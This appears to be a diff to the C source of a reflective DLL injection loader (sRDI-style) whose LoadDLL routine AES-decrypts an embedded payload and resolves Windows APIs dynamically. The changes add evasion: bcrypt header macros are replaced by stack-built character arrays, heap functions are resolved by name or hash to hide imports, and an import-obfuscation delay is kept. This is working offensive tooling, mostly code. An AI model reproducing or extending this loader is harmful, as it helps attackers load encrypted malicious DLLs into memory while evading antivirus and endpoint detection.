@@ -7,7 +7,7 @@
 #include <windows.h>
 #include <winternl.h>
 #include <intrin.h>
-#include <bcrypt.h>
+//#include <bcrypt.h>
 
 #define SRDI_CLEARHEADER 0x1
 #define SRDI_CLEARMEMORY 0x2
@@ -51,6 +51,13 @@
 #define HOST_MACHINE IMAGE_FILE_MACHINE_I386
 #endif
 
+//#define BCRYPT_AES_ALGORITHM L"AES"
+//#define BCRYPT_OBJECT_LENGTH L"ObjectLength"
+//#define BCRYPT_BLOCK_LENGTH L"BlockLength"
+//#define BCRYPT_CHAINING_MODE L"ChainingMode"
+//#define BCRYPT_CHAIN_MODE_CBC L"ChainingModeCBC"
+//#define BCRYPT_BLOCK_PADDING 0x00000001
+
 // 100-ns period
 #define OBFUSCATE_IMPORT_DELAY 5 * 1000 * 10000
 
@@ -74,13 +81,17 @@ typedef VOID(WINAPI* COPYMEMORY)(PVOID, VOID*, SIZE_T);
 typedef NTSTATUS(WINAPI* LDRLOADDLL)(PWCHAR, ULONG, PUNICODE_STRING, PHANDLE);
 typedef NTSTATUS(WINAPI* LDRGETPROCADDRESS)(HMODULE, PANSI_STRING, WORD, PVOID*);
 
-typedef NTSTATUS(WINAPI* BCRYPTOPENALGORITHMPROVIDER)(BCRYPT_ALG_HANDLE*, LPCWSTR, LPCWSTR, ULONG);
-typedef NTSTATUS(WINAPI* BCRYPTGETPROPERTY)(BCRYPT_HANDLE, LPCWSTR, PUCHAR, ULONG, ULONG*, ULONG);
-typedef NTSTATUS(WINAPI* BCRYPTSETPROPERTY)(BCRYPT_HANDLE, LPCWSTR, PUCHAR, ULONG, ULONG);
-typedef NTSTATUS(WINAPI* BCRYPTGENERATESYMMETRICKEY)(BCRYPT_ALG_HANDLE, BCRYPT_KEY_HANDLE*, PUCHAR, ULONG, PUCHAR, ULONG, ULONG);
-typedef NTSTATUS(WINAPI* BCRYPTDECRYPT)(BCRYPT_KEY_HANDLE, PUCHAR, ULONG, VOID*, PUCHAR, ULONG, PUCHAR, ULONG, ULONG*, ULONG);
-typedef NTSTATUS(WINAPI* BCRYPTCLOSEALGORITHMPROVIDER)(BCRYPT_ALG_HANDLE, ULONG);
-typedef NTSTATUS(WINAPI* BCRYPTDESTROYKEY)(BCRYPT_KEY_HANDLE);
+typedef NTSTATUS(WINAPI* BCRYPTOPENALGORITHMPROVIDER)(PVOID*, LPCWSTR, LPCWSTR, ULONG);
+typedef NTSTATUS(WINAPI* BCRYPTGETPROPERTY)(PVOID, LPCWSTR, PUCHAR, ULONG, ULONG*, ULONG);
+typedef NTSTATUS(WINAPI* BCRYPTSETPROPERTY)(PVOID, LPCWSTR, PUCHAR, ULONG, ULONG);
+typedef NTSTATUS(WINAPI* BCRYPTGENERATESYMMETRICKEY)(PVOID, PVOID, PUCHAR, ULONG, PUCHAR, ULONG, ULONG);
+typedef NTSTATUS(WINAPI* BCRYPTDECRYPT)(PVOID, PUCHAR, ULONG, VOID*, PUCHAR, ULONG, PUCHAR, ULONG, ULONG*, ULONG);
+typedef NTSTATUS(WINAPI* BCRYPTCLOSEALGORITHMPROVIDER)(PVOID, ULONG);
+typedef NTSTATUS(WINAPI* BCRYPTDESTROYKEY)(PVOID);
+
+typedef BOOL(WINAPI* HEAPFREE)(HANDLE, DWORD, LPVOID);
+typedef HANDLE(WINAPI* GETPROCESSHEAP)(VOID);
+typedef LPVOID(WINAPI* HEAPALLOC)(HANDLE, DWORD, SIZE_T);
 
 #pragma warning( push )
 #pragma warning( disable : 4214 ) // nonstandard extension
@@ -163,6 +174,10 @@ ULONG_PTR LoadDLL(PBYTE pbCipherText, DWORD dwFunctionHash,
 	BCRYPTCLOSEALGORITHMPROVIDER pBCryptCloseAlgorithmProvider = NULL;
 	BCRYPTDESTROYKEY pBCryptDestroyKey = NULL;
 
+	HEAPFREE pHeapFree = NULL;
+	GETPROCESSHEAP pGetProcessHeap = NULL;
+	HEAPALLOC pHeapAlloc = NULL;
+
 	//CHAR msg[2] = { 'a','\0' };
 	//MESSAGEBOXA pMessageBoxA = NULL;
 
@@ -234,12 +249,23 @@ ULONG_PTR LoadDLL(PBYTE pbCipherText, DWORD dwFunctionHash,
 	BYTE sBCryptDecrypt[] = { 'B', 'C', 'r', 'y', 'p', 't', 'D', 'e', 'c', 'r', 'y', 'p', 't' };
 	BYTE sBCryptCloseAlgorithmProvider[] = { 'B', 'C', 'r', 'y', 'p', 't', 'C', 'l', 'o', 's', 'e', 'A', 'l', 'g', 'o', 'r', 'i', 't', 'h', 'm', 'P', 'r', 'o', 'v', 'i', 'd', 'e', 'r' };
 	BYTE sBCryptDestroyKey[] = { 'B', 'C', 'r', 'y', 'p', 't', 'D', 'e', 's', 't', 'r', 'o', 'y', 'K', 'e', 'y' };
+
+	BYTE SHeapAlloc[] = { 'H', 'e', 'a', 'p', 'A', 'l', 'l', 'o', 'c' };
+	BYTE sGetProcessHeap[] = { 'G', 'e', 't', 'P', 'r', 'o', 'c', 'e', 's', 's', 'H', 'e', 'a', 'p' };
+	BYTE sHeapFree[] = { 'H', 'e', 'a', 'p', 'F', 'r', 'e', 'e' };
+
+	// Bcrypt macro strings
+	WCHAR sChainingModeCBC[] = { 'C', 'h', 'a', 'i', 'n', 'i', 'n', 'g', 'M', 'o', 'd', 'e', 'C', 'B', 'C' };
+	WCHAR sChainingMode[] = { 'C', 'h', 'a', 'i', 'n', 'i', 'n', 'g', 'M', 'o', 'd', 'e' };
+	WCHAR sBlockLength[] = { 'B', 'l', 'o', 'c', 'k', 'L', 'e', 'n', 'g', 't', 'h' };
+	WCHAR sObjectLength[] = { 'O', 'b', 'j', 'e', 'c', 't', 'L', 'e', 'n', 'g', 't', 'h' };
+	WCHAR sAES[] = { 'A', 'E', 'S' };
 	
 	// Crypto
 	NTSTATUS status = STATUS_UNSUCCESSFUL;
 	BYTE rgbIV[16] = { 0 };
 	BYTE rgbAES128Key[16] = { 0 };
-	BCRYPT_ALG_HANDLE hAesAlg = NULL;
+	PVOID hAesAlg = NULL;
 	DWORD cbKeyObject = 0;
 	DWORD cbData = 0;
 	DWORD cbBlockLen = 0;
@@ -247,7 +273,7 @@ ULONG_PTR LoadDLL(PBYTE pbCipherText, DWORD dwFunctionHash,
 	PBYTE pbKeyObject = NULL;
 	PBYTE pbIV = NULL;
 	PBYTE pbRawData = NULL;
-	BCRYPT_KEY_HANDLE hKey = NULL;
+	PVOID hKey = NULL;
 	
 	// Import obfuscation
 	DWORD randSeed;
@@ -300,12 +326,23 @@ ULONG_PTR LoadDLL(PBYTE pbCipherText, DWORD dwFunctionHash,
 	//FILL_STRING_WITH_BUF(aString, sMessageBox);
 	//pLdrGetProcAddress(library, &aString, 0, (PVOID*)&pMessageBoxA);
 
-	FILL_STRING_WITH_BUF(aString, sCopyMemory);
-	status = pLdrGetProcAddress(library, &aString, 0, (PVOID*)&pCopyMemory);
+	//FILL_STRING_WITH_BUF(aString, sCopyMemory);
+	//status = pLdrGetProcAddress(library, &aString, 0, (PVOID*)&pCopyMemory);
 	//pCopyMemory = (COPYMEMORY)GetProcAddressWithHash(COPYMEMORYHASH);
+
+	FILL_STRING_WITH_BUF(aString, sHeapFree);
+	pLdrGetProcAddress(library, &aString, 0, (PVOID*)&pHeapFree);
+
+	FILL_STRING_WITH_BUF(aString, sGetProcessHeap);
+	pLdrGetProcAddress(library, &aString, 0, (PVOID*)&pGetProcessHeap);
+
+	FILL_STRING_WITH_BUF(aString, SHeapAlloc);
+	pLdrGetProcAddress(library, &aString, 0, (PVOID*)&pHeapAlloc);
 	
 	if (!pVirtualAlloc || !pVirtualProtect || !pSleep || /*!pCopyMemory ||*/
-		!pFlushInstructionCache || !pGetNativeSystemInfo) {
+		!pFlushInstructionCache || !pGetNativeSystemInfo || !pHeapFree ||
+		!pGetProcessHeap || !pHeapAlloc) 
+	{
 		return 0;
 	}
 
@@ -333,14 +370,15 @@ ULONG_PTR LoadDLL(PBYTE pbCipherText, DWORD dwFunctionHash,
 	FILL_STRING_WITH_BUF(aString, sBCryptCloseAlgorithmProvider);
 	pLdrGetProcAddress(cryptLib, &aString, 0, (PVOID*)&pBCryptCloseAlgorithmProvider);
 
-	//// WTF
+	/// WTF
 	pBCryptDestroyKey = (BCRYPTDESTROYKEY)GetProcAddressWithHash(BCRYPTDESTROYKEYHASH);
 	//FILL_STRING_WITH_BUF(aString, sBCryptDestroyKey);
 	//pLdrGetProcAddress(cryptLib, &aString, 0, (PVOID*)&pBCryptDestroyKey);
-	//// END OF WTF
-
+	/// END OF WTF
+		
 	if (!pBCryptOpenAlgorithmProvider || !pBCryptGetProperty || !pBCryptSetProperty || !pBCryptGenerateSymmetricKey ||
-		!pBCryptDecrypt || !pBCryptCloseAlgorithmProvider || !pBCryptDestroyKey) {
+		!pBCryptDecrypt || !pBCryptCloseAlgorithmProvider || !pBCryptDestroyKey) 
+	{
 		return 0;
 	}
 	
@@ -350,10 +388,10 @@ ULONG_PTR LoadDLL(PBYTE pbCipherText, DWORD dwFunctionHash,
 	Mcpy(pbCipherText, rgbAES128Key, 16);
 	Mcpy(&pbCipherText[16], rgbIV, 16);
 
-	// Open an algorithm handle.
+	// Open an algorithm handle.	
 	if (!NT_SUCCESS(status = pBCryptOpenAlgorithmProvider(
 		&hAesAlg,
-		BCRYPT_AES_ALGORITHM,
+		sAES,
 		NULL,
 		0)))
 	{
@@ -363,7 +401,7 @@ ULONG_PTR LoadDLL(PBYTE pbCipherText, DWORD dwFunctionHash,
 	// Calculate the size of the buffer to hold the KeyObject.
 	if (!NT_SUCCESS(status = pBCryptGetProperty(
 		hAesAlg,
-		BCRYPT_OBJECT_LENGTH,
+		sObjectLength,
 		(PBYTE)&cbKeyObject,
 		sizeof(DWORD),
 		&cbData,
@@ -373,13 +411,12 @@ ULONG_PTR LoadDLL(PBYTE pbCipherText, DWORD dwFunctionHash,
 	}
 
 	// Allocate the key object on the heap.
-	pbKeyObject = (PBYTE)pVirtualAlloc(NULL, cbKeyObject,
-		MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
+	pbKeyObject = (PBYTE)pHeapAlloc(pGetProcessHeap(), 0, cbKeyObject);
 
 	// Calculate the block length for the IV.
 	pBCryptGetProperty(
 		hAesAlg,
-		BCRYPT_BLOCK_LENGTH,
+		sBlockLength,
 		(PBYTE)&cbBlockLen,
 		sizeof(DWORD),
 		&cbData,
@@ -389,7 +426,7 @@ ULONG_PTR LoadDLL(PBYTE pbCipherText, DWORD dwFunctionHash,
 	// Calculate the block length for the IV.
 	if (!NT_SUCCESS(status = pBCryptGetProperty(
 		hAesAlg,
-		BCRYPT_BLOCK_LENGTH,
+		sBlockLength,
 		(PBYTE)&cbBlockLen,
 		sizeof(DWORD),
 		&cbData,
@@ -418,9 +455,9 @@ ULONG_PTR LoadDLL(PBYTE pbCipherText, DWORD dwFunctionHash,
 
 	if (!NT_SUCCESS(status = pBCryptSetProperty(
 		hAesAlg,
-		BCRYPT_CHAINING_MODE,
-		(PBYTE)BCRYPT_CHAIN_MODE_CBC,
-		sizeof(BCRYPT_CHAIN_MODE_CBC),
+		sChainingMode,
+		(PBYTE)sChainingModeCBC,
+		sizeof(sChainingModeCBC),
 		0)))
 	{
 		goto Cleanup;
@@ -450,13 +487,12 @@ ULONG_PTR LoadDLL(PBYTE pbCipherText, DWORD dwFunctionHash,
 		NULL,
 		0,
 		&cbRawData,
-		BCRYPT_BLOCK_PADDING)))
+		0x00000001)))  // BCRYPT_BLOCK_PADDING
 	{
 		goto Cleanup;
 	}
 
-	pbRawData = (PBYTE)pVirtualAlloc(NULL, cbRawData, 
-		MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
+	pbRawData = (PBYTE)pHeapAlloc(pGetProcessHeap(), 0, cbRawData);
 	if (NULL == pbRawData)
 	{
 		goto Cleanup;
@@ -472,7 +508,7 @@ ULONG_PTR LoadDLL(PBYTE pbCipherText, DWORD dwFunctionHash,
 		pbRawData,
 		cbRawData,
 		&cbRawData,
-		BCRYPT_BLOCK_PADDING)))
+		0x00000001)))  // BCRYPT_BLOCK_PADDING
 	{
 		goto Cleanup;
 	}
@@ -806,35 +842,17 @@ ULONG_PTR LoadDLL(PBYTE pbCipherText, DWORD dwFunctionHash,
 Cleanup:
 
 	if (hAesAlg)
-	{
 		pBCryptCloseAlgorithmProvider(hAesAlg, 0);
-	}
 
 	if (hKey)
-	{
 		pBCryptDestroyKey(hKey);
-	}
 
-	//if (pbCipherText)
-	//{
-	//	pVirtualFree(GetProcessHeap(), 0, pbCipherText);
-	//}
+	if (pbKeyObject)
+		pHeapFree(pGetProcessHeap(), 0, pbKeyObject);
 
-	//if (pbRawData)
-	//{
-	//	pVirtualFree(GetProcessHeap(), 0, pbRawData);
-	//}
+	if (pbRawData)
+		pHeapFree(pGetProcessHeap(), 0, pbRawData);
 
-	//if (pbKeyObject)
-	//{
-	//	pVirtualFree(GetProcessHeap(), 0, pbKeyObject);
-	//}
-
-	//if (pbIV)
-	//{
-	//	pVirtualFree(GetProcessHeap(), 0, pbIV);
-	//}
-	
 	if (pVirtualFree && pLocalFree) {
 		if (!pVirtualFree((LPVOID)pbRawData, 0, 0x8000))
 			pLocalFree((LPVOID)pbRawData);
